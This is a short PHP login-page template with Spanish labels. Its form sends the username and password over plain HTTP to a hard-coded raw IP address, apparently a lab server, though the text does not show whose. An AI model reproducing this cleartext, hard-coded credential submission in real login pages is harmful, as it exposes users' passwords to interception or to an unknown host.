<?PHP
	//SET UP
	$title="LOG IN";
	$level="";
	//INCLUDES
	include("template/head.php");
	include("template/header-user.php");
	include("template/sidebar-rp.php");
	
	//CONTENT
	
	?>
	
	<div class="intro-pu-wrapper">
			<h1>Entrar</h1>
						<form action="http://172.245.21.163/LAB/uploadir/process.php" method="POST" autocomplete="off">
			<div id="form-intro-pu" style="position: absolute;top: 70px;">				<input class="login-user-logo" type="text" style="margin-top:10px" value="Username" onblur="if(value=='') value = 'Username'" onfocus="if(value=='Username') value = ''" name="user" maxlength="30">
				<input class="login-password-logo-wt" style="margin-top:70px" type="password"  name="pass" maxlength="30" onclick="this.className='login-password-logo'" />
				<input type="hidden" name="sublogin" value="1">
				<button value="Login" style="margin-top:130px">Entrar</button>
			</div>
			<div class="intro-pu-options" style="margin-top: 230px">
					<input id="rimaniconnesso" class="login-checkbox" type="checkbox" name="remember"  />
					<label for="rimaniconnesso" class="login-label">No Olvidar</label>
			</div>
			</form>
			<div class="footer-intro-pu">
				Olvido Contrasena? <a href="forgotpass.php">Recuperarla</a>
			</div>
		</div>
		
	<?PHP
		//FOOTER
	include("template/footer.php");
	?>
